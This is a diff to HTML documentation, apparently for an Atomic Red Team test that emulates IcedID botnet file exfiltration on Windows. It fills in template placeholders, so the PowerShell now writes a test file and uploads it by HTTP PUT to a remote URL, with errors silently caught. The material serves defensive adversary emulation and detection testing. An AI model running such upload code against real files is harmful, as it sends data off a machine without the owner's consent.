@@ -354,8 +354,8 @@ Deletes a created file
 <strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$fileName</span> <span class="p">=</span> <span class="s2">&quot;#{file}&quot;</span>
-<span class="nv">$url</span> <span class="p">=</span> <span class="s2">&quot;#{domain}&quot;</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$fileName</span> <span class="p">=</span> <span class="s2">&quot;C:\temp\T1020_exfilFile.txt&quot;</span>
+<span class="nv">$url</span> <span class="p">=</span> <span class="s2">&quot;https://google.com&quot;</span>
 <span class="nv">$file</span> <span class="p">=</span> <span class="nb">New-Item</span> <span class="n">-Force</span> <span class="nv">$fileName</span> <span class="n">-Value</span> <span class="s2">&quot;This is ART IcedID Botnet Exfil Test&quot;</span>
 <span class="nv">$contentType</span> <span class="p">=</span> <span class="s2">&quot;application/octet-stream&quot;</span>
 <span class="k">try</span> <span class="p">{</span><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$url</span> <span class="n">-Method</span> <span class="n">Put</span> <span class="n">-ContentType</span> <span class="nv">$contentType</span> <span class="n">-InFile</span> <span class="nv">$fileName</span><span class="p">}</span> <span class="k">catch</span><span class="p">{}```</span>
